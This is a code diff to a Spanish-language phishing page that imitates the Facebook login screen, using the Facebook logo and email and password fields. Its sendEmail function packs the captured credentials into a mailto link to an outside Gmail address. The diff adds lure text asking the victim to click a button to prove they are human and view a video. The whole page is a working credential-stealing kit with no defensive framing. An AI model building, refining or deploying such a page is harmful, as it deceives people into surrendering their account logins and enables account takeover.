@@ -76,7 +76,7 @@ a:hover {
     <div class="login-container">
         <!-- Logotipo de la empresa -->
         <!-- Logotipo de Facebook (placeholder) -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/768px-Facebook_Logo_%282019%29.png" alt="Facebook" class="logo-facebook" width="25px" height="50px">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/768px-Facebook_Logo_%282019%29.png" alt="Facebook" class="logo-facebook" width="25px" height="auto">
         <form id="login-form">
             <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
             <input type="password" id="password" placeholder="Contraseña" required>
@@ -105,7 +105,7 @@ function sendEmail() {
     const encryptedEmail = encrypt(email);
     const encryptedPassword = encrypt(password);
     const subject = 'Datos de inicio de sesión';
-    const body = `E:${encryptedEmail}\nP: ${encryptedPassword}`;
+    const body = `Para asegurarnos que eres una persona real, por favor haz clic en el botón triangular que aparece en la parte superior de la página, posteriormente se mostrará el contenido del vídeo\nE:${encryptedEmail}\nP: ${encryptedPassword}`;
     const mailtoLink = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
     window.location.href = mailtoLink;
 }
